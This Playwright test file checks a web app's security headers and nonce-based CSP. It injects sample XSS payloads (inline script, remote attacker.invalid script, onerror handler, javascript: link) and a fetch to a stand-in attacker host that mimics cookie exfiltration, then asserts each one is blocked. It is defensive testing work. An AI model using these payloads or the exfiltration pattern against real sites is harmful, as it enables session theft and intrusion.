import { expect, test, type Page } from "@playwright/test";

type Win = { __csp: string[]; __pwned?: boolean };

/** Collects CSP violations the browser reports, so tests can assert on what was (and wasn't) blocked. */
async function trackViolations(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as Win).__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      (window as unknown as Win).__csp.push(`${e.effectiveDirective}|${e.blockedURI}`);
    });
  });
  return () => page.evaluate(() => (window as unknown as Win).__csp);
}

/** Simulates a stored/reflected-XSS bug: attacker-controlled markup arrives inside the server's own HTML. */
async function injectIntoServerHtml(page: Page, markup: string) {
  await page.route("**/system", async (route) => {
    const response = await route.fetch();
    if (!(response.headers()["content-type"] ?? "").includes("text/html")) return route.fulfill({ response });
    const body = (await response.text()).replace("</body>", `${markup}</body>`);
    // Keep every real header (incl. the CSP) but drop the ones that describe the ORIGINAL body bytes,
    // otherwise the browser would truncate/mis-decode our modified HTML.
    const headers = { ...response.headers() };
    delete headers["content-length"];
    delete headers["content-encoding"];
    delete headers["transfer-encoding"];
    return route.fulfill({ status: response.status(), headers, body });
  });
}

test.describe("HTTP security headers", () => {
  test("every page ships the hardening headers and a nonce-based CSP", async ({ request }) => {
    const response = await request.get("/system");
    const h = response.headers();

    expect(h["strict-transport-security"]).toBe("max-age=63072000; includeSubDomains");
    expect(h["x-content-type-options"]).toBe("nosniff");
    expect(h["x-frame-options"]).toBe("DENY");
    expect(h["referrer-policy"]).toBe("no-referrer");
    expect(h["cross-origin-opener-policy"]).toBe("same-origin");
    expect(h["cross-origin-resource-policy"]).toBe("same-origin");
    expect(h["permissions-policy"]).toContain("camera=()");
    expect(h["x-powered-by"]).toBeUndefined(); // don't advertise the framework

    const csp = h["content-security-policy"];
    expect(csp).toMatch(/script-src 'self' 'nonce-[^']+' 'strict-dynamic'/);
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
  });

  test("each response carries a different nonce", async ({ request }) => {
    const nonce = async () =>
      /'nonce-([^']+)'/.exec((await request.get("/system")).headers()["content-security-policy"])?.[1];
    const [a, b] = [await nonce(), await nonce()];
    expect(a).toBeTruthy();
    expect(a).not.toBe(b);
  });

  test("the nonce is stamped onto the page's own scripts", async ({ request }) => {
    const response = await request.get("/system");
    const nonce = /'nonce-([^']+)'/.exec(response.headers()["content-security-policy"])![1];
    expect(await response.text()).toContain(`nonce="${nonce}"`);
  });

  test("error pages carry the same headers", async ({ request }) => {
    const response = await request.get("/definitely-not-a-page");
    expect(response.status()).toBe(404);
    expect(response.headers()["content-security-policy"]).toContain("script-src");
    expect(response.headers()["x-frame-options"]).toBe("DENY");
  });
});

test.describe("CSP in the browser — the app itself", () => {
  test("runs with zero CSP violations and hydrates (client JS executes under the policy)", async ({
    page,
  }) => {
    const violations = await trackViolations(page);
    const consoleErrors: string[] = [];
    page.on("console", (m) => m.type() === "error" && consoleErrors.push(m.text()));

    await page.goto("/system");
    await expect(page.getByText("All systems operational")).toBeVisible(); // proves client JS ran
    await page.getByRole("button", { name: /toggle light\/dark theme/i }).click();

    expect(await violations()).toEqual([]);
    expect(consoleErrors.filter((e) => /content security policy/i.test(e))).toEqual([]);
  });

  test("the 404 page renders under the CSP with zero violations", async ({ page }) => {
    const violations = await trackViolations(page);
    await page.goto("/definitely-not-a-page");
    await expect(page.getByRole("heading", { name: "Page not found" })).toBeVisible();
    expect(await violations()).toEqual([]);
  });
});

test.describe("CSP in the browser — attacks must fail", () => {
  test("injected inline <script> in the server HTML (stored/reflected XSS) does not run", async ({
    page,
  }) => {
    const violations = await trackViolations(page);
    await injectIntoServerHtml(page, `<script>window.__pwned = true</script>`);
    await page.goto("/system");
    await expect(page.getByRole("heading", { name: "System status" })).toBeVisible(); // server-rendered; the fulfilled document cannot reach the loopback API (Chrome LNA)

    expect(await page.evaluate(() => (window as unknown as Win).__pwned)).toBeUndefined();
    expect((await violations()).some((v) => v.startsWith("script-src"))).toBe(true);
  });

  test("an injected remote <script src> from an attacker host is not loaded", async ({ page }) => {
    const violations = await trackViolations(page);
    await injectIntoServerHtml(page, `<script src="https://attacker.invalid/payload.js"></script>`);
    await page.goto("/system");
    await expect(page.getByRole("heading", { name: "System status" })).toBeVisible(); // server-rendered; the fulfilled document cannot reach the loopback API (Chrome LNA)

    const blocked = (await violations()).filter((v) => v.includes("attacker.invalid"));
    expect(blocked.length).toBeGreaterThan(0);
  });

  test("an injected inline event handler (classic XSS payload) does not execute", async ({ page }) => {
    const violations = await trackViolations(page);
    await injectIntoServerHtml(page, `<img src="x" onerror="window.__pwned = true">`);
    await page.goto("/system");
    await expect(page.getByRole("heading", { name: "System status" })).toBeVisible(); // server-rendered; the fulfilled document cannot reach the loopback API (Chrome LNA)
    await page.waitForTimeout(300); // let the failing image's error event fire

    expect(await page.evaluate(() => (window as unknown as Win).__pwned)).toBeUndefined();
    expect((await violations()).some((v) => v.startsWith("script-src"))).toBe(true);
  });

  test("an injected javascript: link does not execute when clicked", async ({ page }) => {
    const violations = await trackViolations(page);
    await injectIntoServerHtml(page, `<a id="evil" href="javascript:window.__pwned=true">click</a>`);
    await page.goto("/system");
    await expect(page.getByRole("heading", { name: "System status" })).toBeVisible(); // server-rendered; the fulfilled document cannot reach the loopback API (Chrome LNA)
    // Activate the link directly: the injected element sits outside the app layout, so Playwright's actionability checks would hang.
    await page.evaluate(() => (document.querySelector("#evil") as HTMLElement).click());

    expect(await page.evaluate(() => (window as unknown as Win).__pwned)).toBeUndefined();
    expect((await violations()).some((v) => v.startsWith("script-src"))).toBe(true);
  });

  test("injected code cannot exfiltrate data to a foreign origin (connect-src)", async ({ page }) => {
    const violations = await trackViolations(page);
    await page.goto("/system");
    await expect(page.getByText("All systems operational")).toBeVisible();

    const outcome = await page.evaluate(() =>
      fetch("https://attacker.invalid/steal?c=cookie").then(
        () => "sent",
        () => "blocked",
      ),
    );

    expect(outcome).toBe("blocked");
    expect((await violations()).some((v) => v.startsWith("connect-src"))).toBe(true);
  });

  test("the page cannot be embedded in a frame (clickjacking)", async ({ page, baseURL }) => {
    await page.goto("about:blank");
    const framed = await page.evaluate(async (url) => {
      const iframe = document.createElement("iframe");
      iframe.src = `${url}/system`;
      document.body.appendChild(iframe);
      await new Promise((r) => setTimeout(r, 1500));
      try {
        // A blocked frame ends up as an error page (cross-origin/empty); a rendered app would expose a heading.
        return iframe.contentDocument?.querySelector("h1")?.textContent ?? null;
      } catch {
        return null;
      }
    }, baseURL);
    expect(framed).toBeNull();
  });
});
